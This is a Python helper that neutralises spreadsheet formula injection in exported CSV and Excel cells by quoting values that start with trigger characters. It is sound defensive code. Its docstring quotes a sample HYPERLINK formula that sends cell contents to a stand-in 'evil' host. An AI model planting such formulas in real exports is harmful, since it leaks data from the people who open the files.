"""
Spreadsheet formula-injection guard for exported cells.

Shared by the site / project exports (``app/routers/export.py``) and the
audit-log CSV (``app/routers/audit_log.py``).
"""

from typing import Any

# Leading characters that make Excel / LibreOffice / Sheets treat a cell as a
# formula (or DDE payload). Tab and CR are included per OWASP's CSV-injection
# guidance.
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value: Any) -> Any:
    """
    Neutralise spreadsheet formula injection in a user-controlled cell value.

    Names, notes, comments and descriptions are free text from any user; a
    value such as ``=HYPERLINK("http://evil/?"&A1,"open")`` would otherwise be
    written as a live formula (openpyxl types any string starting with ``=``
    as one) or evaluated when a CSV is opened. Strings starting with a
    trigger character get a leading single quote; every other value --
    numbers, dates, None -- is returned untouched.
    """
    if isinstance(value, str) and value.startswith(FORMULA_TRIGGERS):
        return "'" + value
    return value
